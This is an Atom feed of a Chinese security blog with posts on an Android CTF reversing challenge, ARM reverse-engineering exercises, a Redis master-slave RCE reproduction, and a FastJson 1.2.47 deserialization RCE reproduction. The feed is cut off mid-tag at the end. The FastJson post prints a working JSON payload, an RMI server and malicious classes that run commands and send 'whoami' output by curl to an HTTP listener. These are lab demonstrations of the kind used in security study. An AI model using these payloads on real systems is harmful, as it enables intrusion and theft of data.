<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Misaki&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="/"/>
  <updated>2019-08-26T09:55:50.708Z</updated>
  <id>/</id>
  
  <author>
    <name>Misaki</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2018 SWPUCTF</title>
    <link href="/2019/08/2018-SWPUCTF/"/>
    <id>/2019/08/2018-SWPUCTF/</id>
    <published>2019-08-26T09:54:14.000Z</published>
    <updated>2019-08-26T09:55:50.708Z</updated>
    
    <content type="html"><![CDATA[<p>某日在GitHub中看到了一些CTF使用的安卓逆向分析题，其中一个是SWPUCTF，是个没怎么听过的CTF。虽然我不怎么了解CTF。23333</p><p>于是，抽时间分析看看是否可以做出来。两个APK。</p><h3 id="app-debug1-apk"><a href="#app-debug1-apk" class="headerlink" title="app-debug1.apk"></a>app-debug1.apk</h3><p>把apk丢到AK中，反编译，结果中有一个目录是assert/timg_2.zip。讲道理，第一反应看到这个，肯定是多多少少有点关系的，本以为是做了代码抽取，动态加载。</p><p><img src="\2019\08\2018-SWPUCTF\1566788175183.png" alt="1566788175183"></p><p>但是这并不是一个zip包，使用010editor查看，发现真不是一个zip包，而是一个完整的jpg格式文件。</p><p><img src="\2019\08\2018-SWPUCTF\1566788301451.png" alt="1566788301451"></p><p>而在文件nextcontent.class中也发现了这个所谓的zip包被当作jpg来读取。</p><p><img src="\2019\08\2018-SWPUCTF\1566788437235.png" alt="1566788437235"></p><p>直接修改为jpg格式图片，打开。</p><p><img src="\2019\08\2018-SWPUCTF\1566788351717.png" alt="1566788351717"></p><p>嗯。。。。这就。。。肯定是姿势不对，换一种方式。</p><p>既然此处是纯JAVA层文件，是对输入的密码的效验，那么采用调试的方式来做。</p><p>此处采用jeb调试，其中，对密码效验的关键方法为check。</p><p>方法开始先判断长度是否为12位，然后判断是否长度为0。</p><p>先修改check下：</p><pre><code>00000000  const/16            v5, 1200000004  const/4             v2, 000000006  invoke-virtual      String-&gt;toCharArray()[C, p10000000C  move-result-object  v10000000E  array-length        v3, v100000010  if-eq               v3, v5, :16  #if-ne  或者添加const/16  v3, 0xc</code></pre><p>在修改mainactivity类中onclick方法下的</p><pre><code>0000001E  new-instance        v0, Check00000022  invoke-direct       Check-&gt;&lt;init&gt;()V, v000000028  invoke-virtual      Check-&gt;checkPassword(String)Z, v0, v20000002E  move-result         v300000030  if-eqz              v3, :72  #修改为if-nez</code></pre><p>重编译安装，输入任意值跳到第二部分，此时显示图片，但是图片上并没有相应的字符串。</p><p>继续调试第二部分。调试的时候发现jeb仍然是不好用，于是改用Androidstudio。在mainactivity2$1.smail文件中找到了读取第二个输入并且做对比的地方。</p><pre><code>.method public onClick(Landroid/view/View;)V    .locals 3    .param p1, &quot;v&quot;    # Landroid/view/View;    .prologue    .line 29    iget-object v2, p0, Lcom/example/test/ctf02/MainActivity2$1;-&gt;this$0:Lcom/example/test/ctf02/MainActivity2;    iget-object v2, v2, Lcom/example/test/ctf02/MainActivity2;-&gt;editText:Landroid/widget/EditText;    invoke-virtual {v2}, Landroid/widget/EditText;-&gt;getText()Landroid/text/Editable;    move-result-object v2    const-string v2, &quot;android.is.very.fun&quot;  #增加    invoke-virtual {v2}, Ljava/lang/Object;-&gt;toString()Ljava/lang/String;    move-result-object v1    .line 30    .local v1, &quot;str&quot;:Ljava/lang/String;    new-instance v0, Landroid/content/Intent;    invoke-direct {v0, v1}, Landroid/content/Intent;-&gt;&lt;init&gt;(Ljava/lang/String;)V    .line 31    .local v0, &quot;intent&quot;:Landroid/content/Intent;    iget-object v2, p0, Lcom/example/test/ctf02/MainActivity2$1;-&gt;this$0:Lcom/example/test/ctf02/MainActivity2;    invoke-virtual {v2, v0}, Lcom/example/test/ctf02/MainActivity2;-&gt;sendBroadcast(Landroid/content/Intent;)V    .line 32    return-void.end method</code></pre><p>获取了Broadcast组件，在mainfast.xml文件中有关于这个组件的定义，于是在上把v2修改为组件名字符串。</p><p>重编译安装，第一个输入只需要随便输入几个不重复的字母，跳到第二个输入，只需要点击确认，就会弹出写有flag的图片。</p><p><img src="\2019\08\2018-SWPUCTF\1566800681246.png" alt="1566800681246"></p><h3 id="app-debug2-apk"><a href="#app-debug2-apk" class="headerlink" title="app-debug2.apk"></a>app-debug2.apk</h3><p>同样，丢到AK中反编译，反编译内容如下，其中包含JNI.smail文件，所以大概率是分析so文件。</p><p><img src="\2019\08\2018-SWPUCTF\1566801125774.png" alt="1566801125774"></p><p>在MainActivity$1.smali中看到了jni的调用getResult方法。</p><pre><code>.method public onClick(Landroid/view/View;)V    .locals 3    .param p1, &quot;v&quot;    # Landroid/view/View;    .prologue    .line 24    iget-object v2, p0, Lcom/example/test/ctf03/MainActivity$1;-&gt;this$0:Lcom/example/test/ctf03/MainActivity;    iget-object v2, v2, Lcom/example/test/ctf03/MainActivity;-&gt;pwd:Landroid/widget/EditText;    invoke-virtual {v2}, Landroid/widget/EditText;-&gt;getText()Landroid/text/Editable;    move-result-object v2    invoke-virtual {v2}, Ljava/lang/Object;-&gt;toString()Ljava/lang/String;    move-result-object v1    .line 25    .local v1, &quot;str&quot;:Ljava/lang/String;    invoke-static {v1}, Lcom/example/test/ctf03/JNI;-&gt;getResult(Ljava/lang/String;)I    move-result v0    .line 26    .local v0, &quot;result&quot;:I    iget-object v2, p0, Lcom/example/test/ctf03/MainActivity$1;-&gt;this$0:Lcom/example/test/ctf03/MainActivity;    invoke-virtual {v2, v0}, Lcom/example/test/ctf03/MainActivity;-&gt;Show(I)V    .line 27    return-void.end method</code></pre><p>使用IDA打开lib目录下的libNative.so文件。</p><p>在Exports中找到对应的方法，在F5一下查看伪代码</p><p><img src="\2019\08\2018-SWPUCTF\1566801664205.png" alt="1566801664205"></p><p><img src="\2019\08\2018-SWPUCTF\1566804309855.png" alt="1566804309855"></p><p>此处先判断是否是长度为15位，然后用malloc申请三个长度为一字节的变量来初始化。至于Init函数是做什么用的。在如下处，点击进入，看到其中又调用了Init函数，再点击进入。</p><pre><code>.text:000011B0                 MOV             R3, R8  ; char *.text:000011B2                 BLX             j__Z4InitPcS_S_PKci</code></pre><p>在如下地址处：</p><p><img src="\2019\08\2018-SWPUCTF\1566804524606.png" alt="1566804524606"></p><p>不过，并没看懂这是啥意思。。。。先继续往下看。</p><p>后面使用了First函数进行处理，如下处。</p><pre><code>.text:000011B6                 MOV             R0, R6  ; char *.text:000011B8                 BLX             j__Z5FirstPc ; First(char *).text:000011BC                 CBZ             R0, loc_11DA</code></pre><p>点击到函数内找到First函数，查看F5</p><pre><code>signed int __fastcall First(char *a1){  int v1; // r1@1  int v2; // r0@3  signed int v3; // r1@3  v1 = 0;  do  {    a1[v1] = 2 * a1[v1] ^ 0x80;    ++v1;  }  while ( v1 != 4 );  v2 = strcmp(a1, &quot;LN^dl&quot;);  v3 = 0;  if ( !v2 )    v3 = 1;  return v3;}</code></pre><p>把传进来的字符串进行按位乘2和0x80异或，如果等于LN^dl，返回v3为1，不等于则返回v3为0。那么此处需要v3等不等于0呢，查看主要函数的下一步判断是if非，跳转到LABEL_14处，那么需要v3不为0，也就是a1等于LN^dl。同样代表了传入的字符串要乘2异或0x80后等于LN^dl。</p><p><img src="\2019\08\2018-SWPUCTF\1566805704718.png" alt="1566805704718"></p><p>其中需要v4跟一个字符串对于，字符串为以下</p><pre><code>0x20, 0x35, 0x2D, 0x16, 0x61</code></pre><p><img src="\2019\08\2018-SWPUCTF\1566807615894.png" alt="1566807615894"></p><p>整体的逻辑就是先分成三个字符串，然后判断第一个异或处理后是否为LN^dl，是的话对下一个字符串异或，对比相等，继续处理最后一个字符串，等于AFBo}则返回需要的1。那么就剩下一个Init不确定意义，根据分配的大小和函数的内容，猜测应该是把15位的字符串，每一位分配给三个字符串组，毕竟Init中有一个循环操作，且标志增加。也就是</p><pre><code>123456分配两组：135  246</code></pre><p>尝试写脚本反向异或出原字符串。</p><pre><code>str1 = &quot;LN^dl&quot;   #v3str2 = [0x20, 0x35, 0x2D, 0x16, 0x61]   #v4str3 = &quot;AFBo}&quot;   #v5flagstr1 = &#39;&#39;flagstr2 = &#39;&#39;flagstr3 = &#39;&#39;i = 0while i&lt;=4:    flagstr =  str2[i] ^ ord(str3[i])    flagstr3 = flagstr3 + chr(flagstr)    i+=1print(flagstr3)   #原字符串后部分i= 0while i&lt;=4:    flagstr =  ord(str1[i]) ^ str2[i]     flagstr2 = flagstr2 + chr(flagstr)    i+=1print(flagstr2)   #原字符串中间部分i=0while i&lt;=4:    flagstr = (ord(str1[i])^ 0x80 ) // 2    flagstr1 = flagstr1 + chr(flagstr)     i+=1print(flagstr1)    #原字符串开始部分flagstr = &#39;&#39;for x in range(len(str1)):    flagstr4 = flagstr1[x]+flagstr2[x]+flagstr3[x]    flagstr = flagstr + flagstr4print(flagstr)</code></pre><p>但是结果很怪，肯定是后面出了问题，但是理论上异或处理是错的，不该只出现在最后一位上，后面找了<a href="https://www.anquanke.com/post/id/168338#h3-20" target="_blank" rel="noopener">官方的WP</a>，看了别人的Java版poc，感觉也一样。莫非是一些编码和语言上处理的差别？暂时没处理掉此问题。</p><p><img src="\2019\08\2018-SWPUCTF\1566812912519.png" alt="1566812912519"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;某日在GitHub中看到了一些CTF使用的安卓逆向分析题，其中一个是SWPUCTF，是个没怎么听过的CTF。虽然我不怎么了解CTF。23333&lt;/p&gt;
&lt;p&gt;于是，抽时间分析看看是否可以做出来。两个APK。&lt;/p&gt;
&lt;h3 id=&quot;app-debug1-apk&quot;&gt;&lt;a hr
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>结构体链表逆向</title>
    <link href="/2019/07/%E7%BB%93%E6%9E%84%E4%BD%93%E9%93%BE%E8%A1%A8%E9%80%86%E5%90%91/"/>
    <id>/2019/07/结构体链表逆向/</id>
    <published>2019-07-26T09:23:50.000Z</published>
    <updated>2019-07-26T09:56:41.098Z</updated>
    
    <content type="html"><![CDATA[<h3 id="结构体链表逆向"><a href="#结构体链表逆向" class="headerlink" title="结构体链表逆向"></a>结构体链表逆向</h3><p>同样使用如下的C代码：</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef struct _student{    char name[32];    int age;    struct _student * next;}T_student;T_student * head = NULL;void Insert(const char *name,int age){    T_student * newnode;    newnode = (T_student *)malloc(sizeof(T_student));    newnode-&gt;age = age;    newnode-&gt;next = head;    strcpy(newnode-&gt;name,name);    head = newnode;}void PrintStudent(){    T_student * tmp;    tmp = head;    while(tmp)    {        printf(&quot;name:%s age:%d\n&quot;,tmp-&gt;name,tmp-&gt;age);        tmp=tmp-&gt;next;    }}int  main(){    Insert(&quot;Panda&quot;,15);    Insert(&quot;Dog&quot;,3);    Insert(&quot;Cat&quot;,2);    Insert(&quot;XiaoMing&quot;,20);    PrintStudent();}</code></pre><p>按照惯例，编译把文件丢到IDA，找到main函数，点开。可以看到调用了四次insert函数和PrintStudent函数。</p><p><img src="\2019\07\结构体链表逆向\1564122124023.png" alt="1564122124023"></p><p>点到insert函数中查看函数实现。传入两个参数后，后面调用了malloc函数来分配内存空间，R3就可以看做是malloc分配来的内存并且指向此块内存的指针。其后使用dest来表示这个指针。var_14把内存数据存入dest加偏移量为32的地址上。也就是把第二个int参数存入相应地址。获取head变量，LDR把head变量当作地址来加载其上的数据，head同样可能是指针。而后会把第一个参数和head指针数据同样存入到结构体对应的地址上。只是第一个参数使用了strcpy来复制，顺便一提可能会产生数据覆盖。最后指针dest存到head的地址上，由head来表示基地址。</p><p><img src="\2019\07\结构体链表逆向\1564123321051.png" alt="1564123321051"></p><p>后面再看一下PrintStudent函数。将head的地址值存到新的指针中。以下仍然使用*head表示存入的地址上的数据。判断值为指针是否为0，从而进行遍历，到此为止基本可以看到前面的结构体存入参数和head赋值，完成了一个链表的结构。此处是遍历链表判断是否遍历完成。</p><p>获取到第一个第二个参数后，var_8指针由参数三来进行下一个结构体的查询。</p><p><img src="\2019\07\结构体链表逆向\1564130434725.png" alt="1564130434725"></p><p>实现大致如下，当执行第一次insert函数时，写入一个结构体，并且把结构体的基地址写入head指针，第二次执行insert函数时，把head指针写入第二个结构体的第三个参数也就是结构体的指向下一个节点的指针。完成一个链表的创建。按照执行顺序，从后往前执行，第三个参数也就是节点的指针是前一个结构体的基地址。直到遍历完成，指针为null。</p><p><img src="\2019\07\结构体链表逆向\1564132058549.png" alt="1564132058549"></p><p>至此，结构体链表的分析就算完成了。无名侠的这个课程也算是结束了，不得不说多看几遍还是有不少的收获。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;结构体链表逆向&quot;&gt;&lt;a href=&quot;#结构体链表逆向&quot; class=&quot;headerlink&quot; title=&quot;结构体链表逆向&quot;&gt;&lt;/a&gt;结构体链表逆向&lt;/h3&gt;&lt;p&gt;同样使用如下的C代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>ARM数组重定向</title>
    <link href="/2019/07/ARM%E6%95%B0%E7%BB%84%E9%87%8D%E5%AE%9A%E5%90%91/"/>
    <id>/2019/07/ARM数组重定向/</id>
    <published>2019-07-26T09:23:36.000Z</published>
    <updated>2019-07-26T09:56:13.330Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ARM数组重定向"><a href="#ARM数组重定向" class="headerlink" title="ARM数组重定向"></a>ARM数组重定向</h3><p>使用如下的C代码做演示，代码是无名侠的一份数组演示代码。如下：</p><pre><code>#include &lt;stdio.h&gt;// Arraysint g_Table[100];int g_Table2[100];void PrintAddr(){    printf(&quot;g_Table:0x%x\ng_Table2:%x\n&quot;,g_Table,g_Table2);}void InitTable(){    int i;    for(i=0;i&lt;100;i++)        g_Table[i] = i;    printf(&quot;Table1 init ok\n&quot;);    for(i=0;i&lt;100;i++)        g_Table2[i] = i;}int search(int key){    int i=0;    for(;i&lt;100;i++)    {        if(g_Table[i]==key)            return i;    }    return -1;}int read(int x){    return g_Table[x];}void write(int x,int value){     g_Table[x] = value;}int main(){    int idx;    PrintAddr();    InitTable();    write(2,200);    write(6,900);    if((idx = search(200))!=-1)        write(idx,400);}</code></pre><p>利用之前的makefile文件进行编译，打可执行文件丢入IDA中打开。选择main函数，大概就是酱紫</p><p><img src="\2019\07\ARM数组重定向\1563864556080.png" alt="1563864556080"></p><p>选择第一个函数PrintAddr来查看其中的实现代码。根据其中的注释就可以看出来输出是的打印g_Table和g_Table2。</p><p><img src="\2019\07\ARM数组重定向\1563865049285.png" alt="1563865049285"></p><p>而对于其中的这两个参数只有类似如下数组地址值，所以打印就是数组的地址。</p><pre><code>.text:00000400                 LDR     R2, =(g_Table_ptr - 0x1FE4).text:00000404                 LDR     R2, [R3,R2] ; g_Table</code></pre><p>回到main函数中，重新选择InitTable函数，在图表视图中可以看到此函数实现了两个循环，具体是哪种循环暂不得知，首先查看第一个循环，从开始的循环赋值和比较开始，</p><p><img src="\2019\07\ARM数组重定向\1563866904258.png" alt="1563866904258"></p><p>在左侧的循环体中，获取的是循环变量的值，在STR指令中，把循环变量存入到了R3(g_Table数组的地址值)，R2、*4代表了int型的四字节长度，所以此处意义是array[i] = i。按照循环变量的增长值按顺序存入到了数组中。</p><p>当循环变量大于99时，跳出循环走到右边的步骤，获取R3的地址值，R3则代表的是一串字符串，其后使用puts输出，利用puts是输出后，会自动在其后添加换行符。然后再对循环体重赋值。</p><p>继续查看第二个循环体，由于跟第一个循环一致，不在细看。</p><p><img src="\2019\07\ARM数组重定向\1563868287872.png" alt="1563868287872"></p><p>分析完InitTable函数后，可以得知，这是一个对全局数组进行赋值的操作。也许后面会用到这个数组。回到main函数中，其后调用了两次write函数，对每个write函数进行两个参数的引用。查看write函数。</p><p><img src="\2019\07\ARM数组重定向\1563868846505.png" alt="1563868846505"></p><p>函数跟InitTable其中对数组的操作类似，都是根据参数进入数组的赋值，如下的对write函数中的第一个参数作为数组的下标，以第二个参数作为需要重新赋值的数组值。array[var_8] = var_c。</p><p><img src="\2019\07\ARM数组重定向\1563870802372.png" alt="1563870802372"></p><p>在去选择search函数，查看函数实现和逻辑，其中传入参数var_10为200，进入循环判断是否大于99，进入循环体，获取数组的下标对应的值，来和传入的参数进行对比不相同则跳转继续循环。相同则跳出循环，获取数组下标值返回，类似如下</p><pre><code>R1 = array[var_8] = array[i]R3 = var_10 = 200if array[var_8] == var_10:    return var_8</code></pre><p><img src="\2019\07\ARM数组重定向\1563874211104.png" alt="1563874211104"></p><p>最后的main函数，重新调用了write函数，利用search的返回值来判断是否是-1，CMN是做负数对比。而R3的负数来源search函数的大于99后仍然没有找到返回值时，返回-1。</p><p><img src="\2019\07\ARM数组重定向\1563875783761.png" alt="1563875783761"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;ARM数组重定向&quot;&gt;&lt;a href=&quot;#ARM数组重定向&quot; class=&quot;headerlink&quot; title=&quot;ARM数组重定向&quot;&gt;&lt;/a&gt;ARM数组重定向&lt;/h3&gt;&lt;p&gt;使用如下的C代码做演示，代码是无名侠的一份数组演示代码。如下：&lt;/p&gt;
&lt;pre&gt;&lt;code
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Redis 主从复制</title>
    <link href="/2019/07/Redis-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"/>
    <id>/2019/07/Redis-主从复制/</id>
    <published>2019-07-15T02:16:27.000Z</published>
    <updated>2019-07-15T02:37:01.336Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Redis主从复制"><a href="#Redis主从复制" class="headerlink" title="Redis主从复制"></a>Redis主从复制</h3><p>redis主从复制，前几天分享的新版redis未授权利用的新型方式。</p><p>什么是主从复制，<a href="http://blog.itpub.net/31545684/viewspace-2213629/" target="_blank" rel="noopener">http://blog.itpub.net/31545684/viewspace-2213629/</a></p><p>通过redis命令来设置主从机</p><pre><code>127.0.0.1:6379&gt; slaveof 192.168.253.131 6379</code></pre><p>被设置的主机将通过SYNC来和主机通信， 通过日志可以看到请求的sync连接。</p><p>首先需要一个高版本的redis服务，<a href="https://redis.io/download。下载后按照官网给的安装步骤来安装。" target="_blank" rel="noopener">https://redis.io/download。下载后按照官网给的安装步骤来安装。</a></p><p>安装后修改redis.conf文件来执行redis，修改文件中的绑定本地地址的参数项，开启任意地址访问。</p><p><img src="\2019\07\Redis-主从复制\1563024704044.png" alt="1563024704044"></p><p>执行命令：<code>src/redis-server ./redis.conf</code>，开启redis成功。</p><p><img src="\2019\07\Redis-主从复制\1563023912222.png" alt="1563023912222"></p><p>下载脚本：<a href="https://github.com/Dliv3/redis-rogue-server。启动执行脚本" target="_blank" rel="noopener">https://github.com/Dliv3/redis-rogue-server。启动执行脚本</a></p><p>脚本执行完后显示：</p><p><img src="\2019\07\Redis-主从复制\1563025997123.png" alt="1563025997123"></p><p>同时可以看到redis日志中加载了so文件：</p><p><img src="\2019\07\Redis-主从复制\1563026034882.png" alt="1563026034882"></p><p>连接redis执行命令：</p><p><img src="\2019\07\Redis-主从复制\1563026095498.png" alt="1563026095498"></p><p>所以在未授权访问和弱密码登陆的情况下此问题才可以利用。</p><p>原文章：<a href="https://paper.seebug.org/975/" target="_blank" rel="noopener">https://paper.seebug.org/975/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Redis主从复制&quot;&gt;&lt;a href=&quot;#Redis主从复制&quot; class=&quot;headerlink&quot; title=&quot;Redis主从复制&quot;&gt;&lt;/a&gt;Redis主从复制&lt;/h3&gt;&lt;p&gt;redis主从复制，前几天分享的新版redis未授权利用的新型方式。&lt;/p&gt;
&lt;p&gt;
      
    
    </summary>
    
    
      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>FastJson 反序列化</title>
    <link href="/2019/07/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>/2019/07/FastJson-反序列化/</id>
    <published>2019-07-15T02:16:07.000Z</published>
    <updated>2019-07-15T02:35:30.420Z</updated>
    
    <content type="html"><![CDATA[<h3 id="FastJson-反序列化"><a href="#FastJson-反序列化" class="headerlink" title="FastJson 反序列化"></a>FastJson 反序列化</h3><p>前一段时间HW护出来一个FastJson的RCE。网上遍布了利用的poc。此处简单模拟一下触发流程。</p><p>先下载1.2.47的FastJson，地址：<a href="http://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.47/FastJson-1.2.47.jar" target="_blank" rel="noopener">http://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.47/FastJson-1.2.47.jar</a></p><p>利用的JDK为，java_8u60。地址：<a href="https://download.oracle.com/otn/java/jdk/8u60-b27/jdk-8u60-windows-x64.exe" target="_blank" rel="noopener">https://download.oracle.com/otn/java/jdk/8u60-b27/jdk-8u60-windows-x64.exe</a></p><p>使用的IDE为IDEA，下载FastJson后导入IDEA。</p><p>从File - Project Structure - Modules - Dependencies导入</p><p>创建poc为如下：</p><pre><code>import com.alibaba.fastjson.JSON;public class poc {    public static void main(String[] argv) {        String payload = &quot;{\&quot;name\&quot;:{\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;},&quot; +                &quot;\&quot;xxxx\&quot;:{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:&quot; +                &quot;\&quot;rmi://localhost:1099/Exploit\&quot;,\&quot;autoCommit\&quot;:true}}}&quot;;        JSON.parse(payload);    }}</code></pre><p><img src="\2019\07\FastJson-反序列化\1563011101595.png" alt="1563011101595"></p><p>创建一个RMI服务器。可以利用如下的JAVA代码。</p><pre><code>import com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.Reference;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class rmiServer {    public static void main(String[] args) throws Exception {        Registry registry = LocateRegistry.createRegistry(1099);        Reference reference = new Reference(&quot;Exloit&quot;,                &quot;Exploit&quot;,&quot;http://localhost:8000/&quot;);        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);        registry.bind(&quot;Exploit&quot;,referenceWrapper);    }}</code></pre><p>或者采用mar创建一个RMI服务器。</p><pre><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://localhost:8000/#Exploit</code></pre><p>再开启一个HTTP服务，下面写入一个恶意class文件。</p><pre><code>import javax.naming.Context;import javax.naming.Name;import javax.naming.spi.ObjectFactory;import java.io.IOException;import java.util.Hashtable;public class Exploit implements ObjectFactory {    @Override    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) {        exec(&quot;xterm&quot;);        return null;    }    public static String exec(String cmd) {        try {            Runtime.getRuntime().exec(&quot;calc&quot;);        } catch (IOException e) {            e.printStackTrace();        }        return &quot;&quot;;    }    public static void main(String[] args) {        exec(&quot;123&quot;);    }}</code></pre><p>此处利用mar创建的RMI服务器来验证：</p><p><img src="\2019\07\FastJson-反序列化\1563012977594.png" alt="1563012977594"></p><p>查看HTTP服务，可以看到请求的恶意class请求。</p><p><img src="\2019\07\FastJson-反序列化\1563013067020.png" alt="1563013067020"></p><p>如果请求了RMI服务后一直卡在没有请求HTTP服务的话，可以查看一下防火墙设置。我就不说卡在这里多久了。23333</p><p>当然如果也可以使用之前老RCE的恶意class文件</p><pre><code>import java.io.BufferedInputStream;import java.io.BufferedReader;import java.io.InputStreamReader;public class exploit2 {    public static String exec(String cmd) throws Exception {        String sb = &quot;&quot;;        BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());        BufferedReader inBr = new BufferedReader(new InputStreamReader(in));        String lineStr;        while ((lineStr = inBr.readLine()) != null)            sb += lineStr + &quot;\n&quot;;        inBr.close();        in.close();        return sb;    }    public exploit2() throws Exception {        String result = &quot;&quot;;        result = exec(&quot;whoami&quot;);        String cmd=&quot;curl http://localhost:8000/&quot;+result;        throw new Exception(exec(cmd));    }    public static void main(String[] args) throws Exception {        String result = &quot;&quot;;        result = exec(&quot;whoami&quot;);        String cmd=&quot;curl http://localhost:8000/&quot;+result;        throw new Exception(exec(cmd));    }}</code></pre><p>执行后，查看携带响应的请求</p><p><img src="\2019\07\FastJson-反序列化\1563013609323.png" alt="1563013609323"></p><p>内容部分POC来源：<a href="https://www.03sec.com/3240.shtml" target="_blank" rel="noopener">https://www.03sec.com/3240.shtml</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;FastJson-反序列化&quot;&gt;&lt;a href=&quot;#FastJson-反序列化&quot; class=&quot;headerlink&quot; title=&quot;FastJson 反序列化&quot;&gt;&lt;/a&gt;FastJson 反序列化&lt;/h3&gt;&lt;p&gt;前一段时间HW护出来一个FastJson的RCE。网
      
    
    </summary>
    
    
      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>逆向函数分析引用</title>
    <link href="/2019/07/%E9%80%86%E5%90%91%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90%E5%BC%95%E7%94%A8/"/>
    <id>/2019/07/逆向函数分析引用/</id>
    <published>2019-07-09T08:56:32.000Z</published>
    <updated>2019-07-26T09:56:38.114Z</updated>
    
    <content type="html"><![CDATA[<p>代码编译，使用代码如下:</p><pre><code>#include &lt;stdio.h&gt;#include &lt;string.h&gt;int fun1(){    int a;    int b;    b=10;    a=b++;    return a;}int fun2(int a,int b){    return a+b+fun1();}int fun3(int a,int b,int c,int d,int e,int f,int g,int h){    if(a+b+c &lt; d+e+f){        return a+b+c+fun2(a,f);    }else if(a+b+c &gt; d+e+f){        return a+b+c+fun2(b,e);    }else{        return 0;    }}int main(){    int tmp;    printf(&quot;%d&quot;,fun3(1,2,3,4,5,6,7,8));    return 0;}</code></pre><p>makefile文件同之前的基本一致</p><pre><code>#设置目录NDK_ROOT=D:\Androidstudio-sdk\android-ndk-r14bTOOLCHAINS_ROOT=$(NDK_ROOT)\toolchains\arm-linux-androideabi-4.9\prebuilt\windows-x86_64TOOLCHAINS_PREFIX=$(TOOLCHAINS_ROOT)\bin\arm-linux-androideabiTOOLCHAINS_INCLUDE=$(TOOLCHAINS_ROOT)\lib\gcc\arm-linux-androideabi\4.9.x\include-fixedPLATFORM_ROOT=$(NDK_ROOT)\platforms\android-14\arch-armPLATFORM_INCLUDE=$(PLATFORM_ROOT)\usr\includePLATFORM_LIB=$(PLATFORM_ROOT)\usr\libMODULE_NAME=app6BUILD_TYPE=cPATH_ANDROID=/data/local/tmp/RM=delFLAGS=-I$(TOOLCHAINS_INCLUDE) \    -I$(PLATFORM_INCLUDE) \    -L$(PLATFORM_LIB) \    -nostdlib \    -lgcc \    -Bdynamic \    -lc    \    -O0OBJS=$(MODULE_NAME).o \    $(PLATFORM_LIB)\crtbegin_dynamic.o \    $(PLATFORM_LIB)\crtend_android.oall:    $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) -c $(MODULE_NAME).$(BUILD_TYPE) -o $(MODULE_NAME).o -pie -fPIE    $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) -S $(MODULE_NAME).$(BUILD_TYPE) -o $(MODULE_NAME).S -pie -fPIE    $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) $(OBJS) -o $(MODULE_NAME) -pie -fPIEclean:    $(RM) *.oinstall:    adb push $(MODULE_NAME) $(PATH_ANDROID)    adb shell chmod 755 $(PATH_ANDROID)$(MODULE_NAME)    adb shell $(PATH_ANDROID)$(MODULE_NAME)</code></pre><p>编译后如下，会生成一个无后缀的可执行文件。丢到IDA中。点击main函数，如下：</p><p><img src="\2019\07\逆向函数分析引用\1562658661016.png" alt="1562658661016"></p><p>其中已经简单分析函数参数的引用，开头可以看到，参数[sp]，意思是第五个参数引用，若后面还有其他参数则以四个字节为参数引用存储。关于寄存器的含义</p><pre><code>r0-r3    用作传入函数参数，传出函数返回值。在子程序调用之间，可以将 r0-r3 用于任何用途。r4-r11   被用来存放函数的局部变量。如果被调用函数使用了这些寄存器，它在返回之前必须恢复这些寄存器的值。r12      是内部调用暂时寄存器 ip。它在过程链接胶合代码（例如，交互操作胶合代码）中用于此角色。r13      是栈指针 sp。它不能用于任何其它用途。sp 中存放的值在退出被调用函数时必须与进入时的值相同。r14      是链接寄存器 lr。如果您保存了返回地址，则可以在调用之间将 r14 用于其它用途，程序返回时要恢复r15      是程序计数器 PC。它不能用于任何其它用途。</code></pre><p>详细介绍参考：<a href="https://www.veryarm.com/36274.html" target="_blank" rel="noopener">https://www.veryarm.com/36274.html</a></p><p>到BL指令，BL指令是有返回的跳转，表示子程序的返回通过LR寄存器保存，保存的地址值就是下一条指令的地址值。如下的fun3函数中，对于多参数并没有使用栈来保存，而是使用R0-R3寄存器来循环的调用。</p><p><img src="\2019\07\逆向函数分析引用\1562659401125.png" alt="1562659401125"></p><p>判断结束后进入不同的分支，走到如图中的两部分分支的时候出现了一个新的子程序调用，fun2。</p><p><img src="\2019\07\逆向函数分析引用\1562659598100.png" alt="1562659598100"></p><p>点击fun2，其中又调用了fun1函数，同样点击fun1。</p><p><img src="\2019\07\逆向函数分析引用\1562659844246.png" 